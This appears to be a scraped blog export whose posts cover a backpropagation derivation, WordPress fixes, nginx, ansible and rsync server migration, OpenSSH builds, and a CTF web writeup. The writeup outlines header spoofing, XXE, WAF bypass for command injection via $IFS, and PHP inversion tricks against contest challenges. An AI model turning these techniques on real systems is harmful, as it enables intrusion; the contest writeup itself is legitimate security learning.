\\begin{bmatrix} 3 &amp; 1 &amp; 4\\ 1 &amp; 5 &amp; 9 \\end{bmatrix} $$ 矩阵三列表示原始空间有三个基向量，也就是说原始空间是三维 有两行表明这三个基向量在变换后都仅用两个坐标来描述 所以它们一定落在二维空间中，因此这是一个从三维空间到二维空间的变换 一个二维向量输入到三维向量输出:$$\\begin{bmatrix}3\\1\\end{bmatrix}\\rightarrow L\\left ( \\vec{\\nu} \\right ) \\rightarrow \\begin{bmatrix}1\\8\\2\\end{bmatrix}$$ 回想线性代数，$ L\\left ( \\vec{\\nu} \\right ) $ 是一个3行2列的矩阵则 $ L\\left ( \\vec{\\nu} \\right ) $ 乘以2行1列(3,1)的矩阵就是以它为基向量作基变换得到的结果就是升维到三维空间后的向量 # 吹完水了，开始推导公式…hexo 支持LaTex参考链接 三层 BPNN 调整网络权重和偏置量的公式分别为 $$ \\omega_{ij}=\\omega_{ij} + \\Delta \\omega_{ij} = \\omega_{ij} + (\\eta)O_{i}E_{j} \\qquad (1) $$ $$ b_{j}=b_{j} + \\Delta b_{j} = b_{j} + (\\eta)E_{j} \\qquad\\quad\\quad (2) $$ 其中： $\\omega_{ij}$ 表示输入层到隐含层的权重，$\\eta$ 表示学习率 $O_{i}$ 表示上一层单元i的输出，$E_{j}$ 表示j层神经元误差 $b_{j}$ 表示j单元偏置量(至于为什么取名为b，下面有提到) 现需要推导(1)(2)式子等号成立 先取激活函数$$f(x)=\\frac{1}{1+e^{-x}}$$ 由上图除了输入层的神经元，每个神经元都会有加权求和得到的输入值 z 和将 z 通过 Sigmoid 函数（也即是激活函数）非线性转化后的输出值 a，他们之间的计算公式如下$$z_{i}^{j}=\\sum_{i=1…n}w_{ij}\\cdot a_{ij}^{l-1}-b_{j}^{l} \\qquad (3)\\a_{j}^{l}=f(z_{j}^{(l)})=\\frac{1}{1+e^{-z_{j}^{(l)}}} \\quad (4)$$ 式子(3)，是不是和 y = kx + b类似？ 其实b可以理解为线性偏差 (这也是取b为名的原因，方便理解) 然后代入到Sigmoid 函数中做非线性变换，做这个变换主要是因为线性模型的表达能力不够(详情请戳我)，其实这个非线性变换也有它的缺点，比如 梯度消失、不是0均值、不是0均值 因为输出层的值与真实的值会存在误差，我们可以用均方误差来衡量预测值和真实值之间的误差。$$E=\\frac{1}{2}\\sum_{j=1}^{l}(Y_{j}^{k}-a_{j}^{l})^{2} \\qquad (5)$$ 其中 $Y_{j}^{k}$ 表示期望输出，是已知量 误差肯定是越小越好。因此，我们就要调整w和b值， 使得误差函数的值最小。 要求式子(5) 在两个变量 ( $\\omega$ 和 $b$ ) 取不同值时的最值，首先想到的就是求各自的偏导了 引入式子(1) 和 (4) 对目标函数 E 求 $\\omega$ 和 $b$ 的偏导可以得到 $\\omega$ 和 $b$ 的更新量 下面拿求 $\\omega$ 偏导来做推导。$$\\Delta \\omega_{ij} = \\eta\\frac{\\partial E}{\\partial w_{hj}} \\qquad (6)$$ $\\eta$ 学习率取值通常为 0.1 ~ 0.3,可以理解为每次梯度所迈的步伐。 $w_{hj}$为 h 和 j 两层神经元之间的权重 注意到 $w_{hj}$ 的值先影响到第 j 个输出层神经元的输入值 a，再影响到输出值 y 根据链式求导法对权重求偏导有：$$\\frac{\\partial E}{\\partial w_{hj}} =\\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}}\\cdot\\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} \\qquad (7)$$ 由 (3) 有:$$\\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} = {(\\sum_{i=1…n}w_{hj}\\cdot a_{hj}^{l-1}-b_{j}^{l})}’ = a_{hj}^{l-1} = O_{i} \\qquad (8)$$ 与神经网络结构图对应知 $ a_{hj}^{l-1} $ 为上一层单元i的输出 $ O_{i} $ Sigmoid 求导的式子如下，求导过程请戳我$$f{}’(x) = f(x)(1-f(x)) \\qquad (9)$$由 (5) 和 (9) 有：$$\\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}} = -\\frac{1}{2}\\cdot 2\\cdot (Y_{j}^{k}-a_{j}^{i})\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}}=a_{j}^{l}\\cdot (1-a_{j}^{l})\\cdot (Y_{j}^{k}-a_{j}^{l}) = E_{j} \\qquad (10)$$ 再看看式子 (1) 和 (2) 中的 $E_{j}$，课本给出 关于 $ E_{j} $的公式:$$E_{j} = O_{j}(1-O_{j})(T_{j}-O_{j}) = O_{j}(1-O_{j}))\\sum_{k}w_{jk}E_{k} \\qquad (11)$$ 其中 $ T_{j} $ 是输出单元 $j$ 的预期是输出， 即式子 (10) 中的 $ Y_{j}^{k} $ $ E_{k} $ 表示它连接的后面一层的单元 $k$ 的误差, 由此看式子 (11) 其实还挺容易理解的：$ O_{j}(1-O_{j}) $ 表示 sigmod函数的偏导，即表示调整误差的速度即 j 层神经元误差是通过预期输出与实际输出的差值和调整误差速度来获取的 激动人心的时候到啦!! 式子 (1)为: $ \\omega_{ij}=\\omega_{ij} + \\Delta \\omega_{ij} $ 式子 (6)为: $ \\Delta \\omega_{ij} = \\eta\\frac{\\partial E}{\\partial w_{hj}} $ 式子 (7)为: $ \\frac{\\partial E}{\\partial w_{hj}} =\\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}}\\cdot\\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} $ 式子 (8) 和 (10) 分别为: $ \\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} = a_{hj}^{l-1} = O_{i} \\qquad $ $ \\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}} = a_{j}^{l}\\cdot (1-a_{j}^{l})\\cdot (Y_{j}^{k}-a_{j}^{l}) = E_{j} $ 即: $ \\Delta \\omega_{ij} = (\\eta)O_{i}E_{j} $ 类似也可以证得偏置量公式 $ b_{j} = -(\\eta)E_{j} $心累,,,不过推导完后，感觉还挺好玩的，23333 参考链接：csdn: zhiyong_willgithub: edvardHuacsdn: csdn人工智能头条","categories":[{"name":"学校课程","slug":"学校课程","permalink":"https://tari.moe/categories/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"}],"tags":[]},{"title":"wordpress 常见问题汇总","slug":"2019/wordpress_problem","date":"2019-09-23T08:21:21.000Z","updated":"2021-06-09T02:07:10.730Z","comments":true,"path":"/p/2019/wordpress_problem/","link":"","permalink":"https://tari.moe/p/2019/wordpress_problem/","excerpt":"","text":"wordpress升级后后台访问不了Cannot Modify Header Information – Headers Already Sent By……. 解决办法一：在主题目录下functions.php开头加入ob_start()； 解决办法二：找到sent by后面的.php文件，保存为UTF-8无BOM编码格式; vim 的话，命令模式输入 :set nobomb 即可转换为UTF-8无BOM编码格式 wordpress 后台媒体库不显示以及上传错误在&lt;!DOCTYPE&gt; 声明之前有其他的代码导致浏览器不能正确识别页面的标准，所以才造成了某些基于html5的特性不能使用。 参考链接 https://www.zmki.cn/1428.html","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"运维/Wordpress","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Wordpress/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"2019年第三届广东省强网杯网络安全大赛WEBwriteup","slug":"2019/2019qwb","date":"2019-09-10T12:08:00.000Z","updated":"2021-08-12T15:53:07.151Z","comments":true,"path":"/p/2019/2019qwb/","link":"","permalink":"https://tari.moe/p/2019/2019qwb/","excerpt":"","text":"八卦本次比赛的一个槽点，为什么是在星期一二举行咧… 由于我只会一点 web ，所以只解出几道 web 题 Writeby TARITARI 1. Web – 小明又被拒绝了看到题目很容易想到改http头，于是抓包。一开始直接改cookie: admin=1无效，后来想了下，小明如果是本地人就不会被拒绝啦！于是用到X-Forwarded-For字段，伪造ip为本地地址127.0.0.1。提交过去发现不是admin，改好cookie后即可获得flag{xxasdasdd_for} 2. Web – XX？看到题目就想到了xxe，先访问网站发现网站的标题为gedit 然后网上搜了下发现gedit在写完文件后，默认会产生一个以~结尾的备份文件名例如：index.php~。这可用于从服务器中提取源代码/文件。然后御剑扫描发现有三个文件，于是访问index.php~得到源码。哦豁，果然是xxe。 我有一个大胆的想法，flag.php会不会也有呢？好吧，没有。那我们继续外部实体注入攻击，结合扫描出来的flag.php，得到base64编码。解码可得flag{IUyasd8213123123890} 3. 免费的,ping一下~结合题目和页面，是php ping命令执行无误了，ls一下，果然是这样。然后尝试ls一下根目录，发现waf过滤敏感字符了。于是测试被过滤掉的是空格还是“/“斜杠。结合网上搜一下，得知中有个变量叫IFS(Internal Field Seprator) ,内部域分隔符，即空格。代替原来的成功执行了。继续ls得知原来是空格被waf过滤掉了。嘿嘿，那就是可以cat /flag啦，执行以下，然后得知cat 或flag关键字又被过滤了。由于我偶尔会编写shell脚本，想到用变量拼接可以绕过关键字的过滤。然后一顿猛如虎的操作，结果被告知flag不在第一行。而且他只能显示部分内容。。。最后使用tail -n 1 /flag 成功获取flag{llllll_U_GeT_Th3_fl4g} 4. php访问页面得到一个apache的欢迎页面，于是直接用御剑扫，得到三个文件访问index.php得知本题为条件绕过型题目。第一眼看过去整个人傻了，无数字字母还好说，可以用异或^，左右移等等去绕过。然后发现取反和自增可以绕过，但是长度只有27，太苛刻了。于是想到，如果这个是php7，那么就可以利用php7的新特性，即可以通过($function)();的方式动态执行函数。https://www.php.net/manual/zh/migration70.incompatible.php取反~符号可以把字母数字符号等等变为不可见字符，就可以轻松绕过正则了，为了被成功解析，使用urlencode一下。 先copy下来，本地测试，注释掉错误回显，方便调试。先试试phpinfo测试一下，通过 echo urlencode(~”phpinfo”)构造一下。 加上(~exp)(); 试试，就发现可以在题目环境中成功执行，接下来就简单了。 构造 GetYourFlag调用GetYouFlag()OK，接下来最后发现flag{3904c5df2e894ca02a21004feb21e617} 在源码中。","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"wordpress后台登录密码前端js加密+php后端解密","slug":"2019/wordpress后台登录加密","date":"2019-08-26T13:03:23.000Z","updated":"2021-04-02T02:26:16.154Z","comments":true,"path":"/p/2019/wordpress后台登录加密/","link":"","permalink":"https://tari.moe/p/2019/wordpress%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8A%A0%E5%AF%86/","excerpt":"","text":"由于特殊原因，wordpress后台登录密码不能被明文抓包…于是我采用 rsa 前端 js 加密 + php 后端解密 的方式进行 那只能大费周章去改wordpress代码了= = 。。。。 由于 wordpress 登录时 wp-login.php 是直接提交表单给自己的于是想到用 jquery 去修改表单数据， 直接上代码。 wordpress根目录 wp-login.php 文件此处需要用到两个库文件 jQuery 和 jsencrypt在表单代码后面的 js 处 添加 123456789101112131415161718&lt;script type=&quot;text/javascript&quot; src=&quot;./wp-includes/js/jquery/jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;./wp-includes/js/jsencrypt.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; /* * writeBy：TARI * date: 2019/08/26 * usage: $(&quot;#user_pass&quot;).change方法对密码进行 rsa 公钥加密传输 */ $(&quot;#user_pass&quot;).change(function()&#123;//失去焦点触发，就是点击登陆按钮后触发 // 数据处理 var pubkey = &#x27;你的公钥&#x27; var encrypt = new JSEncrypt(); encrypt.setPublicKey(pubkey); var encrypted = encrypt.encrypt($(&#x27;#user_pass&#x27;).val()) $(&quot;#user_pass&quot;).val(encrypted); //重新赋值 &#125;);&lt;!-- 下面还有wp_attempt_focus()等函数， 或者新建一对 js 标签也行，不过我没测试过 --&gt;&lt;/script&gt; wordpress根目录/wp-includes/pluggable.php 文件12345678910111213141516function wp_authenticate($username, $password) &#123; $username = sanitize_user($username); $password = trim($password); // 这里后添加如下代码： // 私钥不能因为好看而添加乱七八糟的缩减之类的 $private_key = &quot;私钥内容&quot;; $decrypt_data = &#x27;&#x27;; // 判断私钥是否是可用的，可用返回资源id $pi_key = openssl_pkey_get_private($private_key); // 解密数据, 这里要进行 base64 解码是因为浏览器会默认帮你的数据进行编码 openssl_private_decrypt(base64_decode($password), $decrypt_data, $private_key); $password = $decrypt_data; //下面一堆代码 balabala&#125; 再抓包密码就是加密状态啦！在 wordpress 找密码验证的函数和文件找了挺久的….","categories":[{"name":"开发","slug":"开发","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/"},{"name":"Wordpress","slug":"开发/Wordpress","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Wordpress/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://tari.moe/tags/%E5%BC%80%E5%8F%91/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://tari.moe/tags/Wordpress/"}]},{"title":"nginx双冗余及负载均衡搭建","slug":"2019/Redundancy and load balancing","date":"2019-07-28T07:03:22.000Z","updated":"2021-06-09T00:36:44.912Z","comments":true,"path":"/p/2019/Redundancy and load balancing/","link":"","permalink":"https://tari.moe/p/2019/Redundancy%20and%20load%20balancing/","excerpt":"","text":"nginx 双冗余nginx 冗余安装脚本链接配置文件的 链接在此 **注意事项** /etc/selinux/configSELINUX=off 感觉线上和线下一个比较大的区别就在防火墙，线下可以的在被这个卡了半天 123# eth0 该字段根据网卡类型来定义firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPTfirewall-cmd --reload 这个ip转发用不用就忘了测试了，如果开启防火墙还不行就试试吧。echo “net.ipv4.ip_forward = 1” &gt;&gt; /etc/sysctl.conf 如果没装 zlib zlib-devel openssl 的记得安装喔！ *** WARNING - this build will not support IPVS with IPv6. Please install libnl/libnl-3 dev libraries to support IPv6 with IPVS. 1yum -y install libnl libnl-devel nginx 负载均衡nginx 配置文件内 upstream yourname &#123; yourip; &#125; location / &#123; proxy_pass http://yourname; &#125;","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Nginx","slug":"运维/Nginx","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Nginx/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"「量詞」","slug":"2019/「量詞」","date":"2019-07-23T11:33:28.000Z","updated":"2021-04-02T02:13:19.068Z","comments":true,"path":"/p/2019/「量詞」/","link":"","permalink":"https://tari.moe/p/2019/%E3%80%8C%E9%87%8F%E8%A9%9E%E3%80%8D/","excerpt":"","text":"- –&gt; –&gt; - １ いち か さ た は 行 いっ 枚、回、台、歳 ６ ろく か さ た は 行 ろっ 枚、回、台、歳 ８ はち か は 行 はっ 枚、回、台、歳 １０ じゅう か さ た は 行 じゅっ 枚、回、台、歳 例：リンゴを三つ買いました&emsp;&emsp;写真を3枚撮りました&emsp;&emsp;蜜柑を８つ食べました 昨日は4時間しか寝ませんでしたしか + ませんでした 要翻訳成肯定 [量詞] + も 強調 [重 厚 長 大 多]ケーキを8個も食べました [量詞] + しか 強調 [軽 薄 短 小 少]財布に１０元しかありません [量詞] だけ zhiyou~ 10分だけ休みましょう [量詞] ぐらい ~左右 財布に１０元ぐ(く)らいあります [量詞] は zhishao~ 財布に１０００元はあります","categories":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"}],"tags":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"}]},{"title":"Web站群从Ubuntu14.04迁移至CentOS7","slug":"2019/ansible-shell","date":"2019-07-15T04:47:50.000Z","updated":"2021-06-09T02:04:44.522Z","comments":true,"path":"/p/2019/ansible-shell/","link":"","permalink":"https://tari.moe/p/2019/ansible-shell/","excerpt":"","text":"nfs迁移 系统环境: CentOS-7-x86_64-Minimal-1511相关的剧本和脚本可以 参考我的github common.sh 为公用脚本，包含公用模块 服务器备份1ansible-playbook srvs_backup_role.yml 出现问题: failed: [192.168.206.132] (item=baseVersionBackup.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;fe2fab79a66b8f5489418fd7b556cdbb74abcac6&quot;, &quot;item&quot;: &quot;baseVersionBackup.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125; failed: [192.168.206.132] (item=common.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;b8554aa38d74846821d3575eaf72854f2eb40338&quot;, &quot;item&quot;: &quot;common.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125; 这个问题主要是由 SELinux（Security-Enhanced Linux）引起的. CentOS7 一般自带 libselinux-python 12# 没有的话可以安装一下yum -y install libselinux-python 由于我不大了解它, 干脆就把它的禁用了, 记得在目标主机禁用喔.. 123sed -i &#x27;/^SELINUX/s/SELINUX=enforcing/SELINUX=disabled/&#x27; /etc/selinux/config &amp;&amp;sed -i &#x27;/^SELINUX/s/SELINUX=permissive/SELINUX=disabled/&#x27; /etc/selinux/config 更新源为阿里云源这个过程可能要下载的东西较多，有些主机可能写到大半就连接超时了。对于少许主机可以直连上去执行 yum update 1ansible-playbook yum_aliyun_source_role.yml openssh 安装启用 telnet 以防万一12ansible webGroup -m shell -a &#x27;yum -y install xinetd telnet-server&#x27;ansible webGroup -m shell -a &#x27;ls -ll /etc/xinetd.d/telnet&#x27; 添加用户以防万一1234567---- hosts: webGroup remote_user: root tasks: - name: create username user user: name=username password=yourpassword 123456789---- hosts: &#123;&#123; runHost &#125;&#125; remote_user: root tasks: - name: create username group group: name=username state=absent - name: create username user user: name=username state=absent 关闭防火墙，让外边的 telnet 请求可以进来 1firewall-cmd --add-service=telnet --permanent 或者 1234iptables -I INPUT -p tcp --dport 23 -jACCEPTiptables -I INPUT -p udp --dport 23 -jACCEPTservice iptables saveservice iptables restart 准备工作完成，开始安装 OpenSSH1ansible-playbook openssh_role.yml 确认是否升级成功 1ansible webGroup -m shell -a &quot;ssh -V&quot; 重启一下主机，等待少许时间并检测 sshd 的状态， 123ansible webGroup -m shell -a &quot;reboot&quot;ansible webGroup -m shell -a &quot;systemctl status sshd&quot; 对于有问题的少许主机可以直连上去执行 systemctl stop sshd 并等待少许执行systemctl start sshd 开启防火墙，阻止外边的 telnet 请求进来 1firewall-cmd --remove-service=telnet 或者 1iptables -A INPUT -p tcp --dport 23 -jDROP 对相应的服务器安装 nginx 1.16.01ansible-playbook nginx_role.yml nginx的配置根据旧服务器的来就好了. nginx 双冗余nginx 存活探测脚本链接配置文件的 链接在此//注意事项// 脚本要用到 killall 命令, 没有的同学记得装, centos killall的包是，不过我的脚本会默认帮你装上。 1yum -y install psmisc 防火墙的的网卡 eth0 记得跟根据自己的网卡来 12firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPTfirewall-cmd --reload nginx 负载均衡这个比较容易, 需要注意的是如果用到 session 记得用 哈希法 即添加 ip_hash; 到 upsteam 中就好啦 对相应的服务器安装 PHP7.21ansible-playbook php_role.yml 根据网上资料推荐使用 sock 而且不是 端口cgi 模式php旧服务器的配置更换了 /etc/php.ini 和 /etc/php-fpm.d/www.conf 文件到新服务中 对相应的服务器安装 mysql5.71ansible-playbook mysql_role.yml 安装完后记得对导入的数据授权喔！！！不然远程连接会被禁止掉的。 为了方便知道自己操控哪个服务器在 /etc/bashrc 或 ~/.bashrc 文件最后添加 1export PS1=&quot;[\\u@`hostname -I | cut -d &quot;.&quot; -f 4`\\W]# &quot; 然后 source 一下 调整时间、时区由于我的时间和北京时间是一样的, 所以我就省略这步啦! nfs 服务器的迁移common.sh 和 nfs.sh 脚本位置首先配置要使用 nfs 服务的服务器路径 # /etc/exports 文件 /home/www/某个站点 ip地址(rw,sync,all_squash,no_subtree_check) /home/www/某个站点 IP地址(rw,sync,all_squash,no_subtree_check) /home 路径是下图 mounted on 下的路径 参数说明: rw 读写权限 sync 数据同步写入内存缓冲区和硬盘, 保证数据一致 all_squash 所有访问用户都映射为匿名用户或用户组 no_subtree_check 即使输出目录是一个子目录，nfs服务器也不检查其父目录的权限 把文件传送到目标服务器balabala～ 1systemctl reload nfs 允许相应服务的防火墙 1234firewall-cmd --add-service=nfs --permanent --zone=publicfirewall-cmd --add-service=mountd --permanent --zone=publicfirewall-cmd --add-service=rpc-bind --permanent --zone=publicfirewall-cmd --reload 创建相应文件的软连接方便nfs上nginx的使用在web服务器上创建要挂载的文件夹并挂载 临时挂载 1mount -t nfs nfs的IP地址:路径 本机路径 /etc/fstab 文件添加以用于开机启动 nfs的ip地址:路径 本机路径 nfs rw 0 0 nfs的ip地址:路径 本机路径 nfs rw 0 0 需要主要，两台不同服务器的用户的gid和uid一不一致，不然会出现旧服务器无法写入的现象 rsync 增量备份小前言: 权限明明够，但是一直报这个错： rsync: recv_generator: mkdir &quot;test&quot; (in home_131) failed: Permission denied (13) 后来发现 selinux 没关闭。。。。。。。。。。。。 首先开放端口吧！如果用的是 iptables 1vi etc/sysconfig/iptables 添加 -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT 或者直接 1iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT 然后再重启一下就行了 1systemctl restart iptables 或 1iptables-save 如果用的是 firewalld 123firewall-cmd --add-port=873/tcp --permanent &amp;&amp;firewall-cmd --reload &amp;&amp;firewall-cmd --list-port 我搭建的 rsync 是这样子的，主服务器 (也就是正在运行Web服务器的服务器) 文件发生改变 (内容改变或者文件本身的增加或者删除) 就会通过监听脚本自动备份到备份服务器 以下安装和配置 rsync 是参考该链接 站长那些事儿 两台服务器一起安装 rsync1yum install rsync xinetd -y 还要增加一个配置文件 (这个配置文件在CentOS7下不存在，我们手动创建) 1vi /etc/xinetd.d/rsync 内容如下 # default: off # description: The rsync server is a good addition to an ftp server, as it \\ # allows crc checksumming etc. service rsync &#123; disable = no flags = IPv6 socket_type = stream wait = no user = root server = /usr/bin/rsync server_args = --daemon log_on_failure += USERID &#125; 是 从这里 找滴，亲测可用 接下来是 负责备份的服务器 的事情了1vi /etc/rsyncd.conf 添加以下内容 log file = /var/log/rsyncd.log pidfile = /var/run/rsyncd.pid lock file = /var/run/rsync.lock secrets file = /etc/rsync.pass motd file = /etc/rsyncd.Motd #模块名称 [test] #你想备份在本服务器哪个路径就填呗 path = /home/test #描述随便加 comment = just a test uid = 0 gid = 0 port = 873 use chroot = no read only = no list = no max connections = 200 timeout = 600 #认证用户名，可以随便取 auth users = test_user #主服务器IP地址 hosts allow = 你的ip地址 认证用户和密码文件，系统原本没有，需要我们手动创建的喔。该文件名字可以随意 1vi /etc/rsync.pass 里面是内容是 键值对 test_user:testpass 这里注意啦，必须是权限必须是 600 喔 123chmod 600 /etc/rsyncd.conf &amp;&amp;chmod 600 /etc/rsync.pass &amp;&amp;service xinetd restart 启动 rsync 有些需要有些不需要， 可能是防火墙原因阻拦了其他端口… 1rsync --daemon --config=/etc/rsyncd.conf --port=873 接下来到 主服务器 的事情了首先创建密码文件，文件名字也是可以随意喔！ 1vi /etc/passwd.rsync 内容注意啦 testpass 是 刚刚备份服务器 /etc/rsync.pass 目录下认证用户的密码喔，只需填上面红字的内容就OK啦 这里权限也要注意，必须是 600 喔 12chmod 600 /etc/passwd.rsync &amp;&amp;service xinetd restart 先安装预编译所需要的工具 1yum install make gcc gcc-c++ -y 然后下载和安装inotify-tools 123456cd /usr/local/src &amp;&amp;wget https://download.laobuluo.com/tools/inotify-tools-3.14.tar.gz &amp;&amp;tar -zxvf inotify-tools-3.14.tar.gz &amp;&amp;cd inotify-tools-3.14 &amp;&amp;./configure --prefix=/usr/local/inotify &amp;&amp;make &amp;&amp; make install 配置环境变量 1234echo &quot;PATH=/usr/local/inotify/bin:$PATH&quot; &gt;&gt;/etc/profile.d/inotify.sh &amp;&amp;source /etc/profile.d/inotify.sh &amp;&amp;echo &quot;/usr/local/inotify/lib&quot; &gt;/etc/ld.so.conf.d/inotify.conf &amp;&amp;ln -s /usr/local/inotify/include /usr/include/inotify 配置参数 1vi /etc/sysctl.conf 注释后面添加 fs.inotify.max_queued_events=99999999 fs.inotify.max_user_watches=99999999 fs.inotify.max_user_instances=65535 创建排除目录列表 1vi /usr/local/inotify/exclude.list 创建一个排除目录，这里可以添加不同步的目录，一行一个目录。如果暂时没有可以留空，以后需要用到在添加。 如果 uploads 目录是挂载目录可以排除掉 wp-content/uploads/ 增量备份脚本 1vi /usr/local/inotify/rsync.sh 123456789101112131415161718192021222324#!/bin/sh#主服务器需要备份的目录srcdir=/home/test#模块名称dstdir=testexcludedir=/usr/local/inotify/exclude.list#认证名称rsyncuser=test_user#本机存密码的目录rsyncpassdir=/etc/passwd.rsync#备份服务器的IP地址dstip=&quot;备份服务器滴IP地址&quot;for ip in $dstipdorsync -avH --port=873 --progress --delete --exclude-from=$excludedir $srcdir $rsyncuser@$ip::$dstdir --password-file=$rsyncpassdirdone/usr/local/inotify/bin/inotifywait -mrq --timefmt &#x27;%d/%m/%y %H:%M&#x27; --format &#x27;%T %w%f%e&#x27; -e close_write,modify,delete,create,attrib,move $srcdir | while read filedofor ip in $dstipdorsync -avH --port=873 --progress --delete --exclude-from=$excludedir $srcdir $rsyncuser@$ip::$dstdir --password-file=$rsyncpassdirecho &quot; $&#123;file&#125; was rsynced&quot; &gt;&gt; /tmp/rsync.log 2&gt;&amp;1donedone 脚本可执行权限 1chmod +x /usr/local/inotify/rsync.sh 添加开机启动 1vi /etc/rc.d/rc.local 开机启动文件中最后一行添加 sh /usr/local/inotify/rsync.sh &amp; 通过互换 ip 迁移服务器Centos重启网络配置文件会导致 /etc/resolv.conf 被覆盖或清空 进而导致 yum 无法使用","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"运维/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"Install_OpenSSH8.0p1_from_source","slug":"2019/Install-OpenSSH8-0p1-from-source","date":"2019-07-14T08:04:44.000Z","updated":"2021-06-09T02:05:33.797Z","comments":true,"path":"/p/2019/Install-OpenSSH8-0p1-from-source/","link":"","permalink":"https://tari.moe/p/2019/Install-OpenSSH8-0p1-from-source/","excerpt":"","text":"系统环境: CentOS-7-x86_64-Minimal-1511root用户+备份+下载包+校验包 一气呵成Package Information (包的相关信息) Download (HTTP): https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.0p1.tar.gz Download MD5 sum: bf050f002fe510e1daecd39044e1122d Download size: 1.5 MB Estimated disk space required: 45 MB (add 12 MB for tests) Estimated build time: 0.4 SBU (running the tests takes 17+ minutes, irrespective of processor speed) 虽然没出过事, 但还是要留条退路安装 telnet 12yum -y install telnet-server.x86_64 &amp;&amp;yum -y install telnet.x86_64 安装 xinetd (提供访问和日志管理等功能) 1yum -y install xinetd.x86_64 开启服务 &amp;&amp; 开机启动 12345systemctl start xinetd &amp;&amp;systemctl start telnet.socket &amp;&amp;systemctl enable telnet.socket &amp;&amp;systemctl enable xinetd.service 预编译如果直接上可能出现以下 4 个问题: 一checking for cc... no checking for gcc... no configure: error: in \\`/root/openssh-8.0p1&#39;: configure: error: no acceptable C compiler found in $PATH See \\`config.log&#39; for more details 缺少 cc 和 gcc 编译器, 解决方法: 1yum -y install cc gcc 二checking for zlib.h... no configure: error: *** zlib.h missing - please install first or check config.log *** 缺少 zlib-devel 环境, 解决方法: 1yum -y install zlib-devel 三configure: error: *** working libcrypto not found, check config.log libcrypto 有点眼熟…解决方法: 1yum install openssl-devel 四configure: error: PAM headers not found 缺少pam-devel环境, 解决方法: 1yum install pam-devel 设置适当的环境以用于其他安装步骤： 123456789install -v -m700 -d /var/lib/sshd &amp;&amp;chown -v root:sys /var/lib/sshd &amp;&amp;groupadd -g 50 sshd &amp;&amp;useradd -c &#x27;sshd PrivSep&#x27; \\ -d /var/lib/sshd \\ -g sshd \\ -s /bin/false \\ -u 50 sshd 安装官网的编译应该木得问题了 12345./configure --prefix=/usr \\ --sysconfdir=/etc/ssh \\ --with-md5-passwords \\ --with-pam \\ --with-privsep-path=/var/lib/sshd 编译并测试下make &amp;&amp; make test 安装12345678make install &amp;&amp;install -v -m755 contrib/ssh-copy-id /usr/bin &amp;&amp;install -v -m644 contrib/ssh-copy-id.1 \\ /usr/share/man/man1 &amp;&amp;install -v -m755 -d /usr/share/doc/openssh-8.0p1 &amp;&amp;install -v -m644 INSTALL LICENCE OVERVIEW README* \\ /usr/share/doc/openssh-8.0p1 遇到的两个错误信息一/etc/ssh/sshd_config line 79: Unsupported option GSSAPIAuthentication /etc/ssh/sshd_config line 80: Unsupported option GSSAPICleanupCredentials 注释掉这两行就好啦, 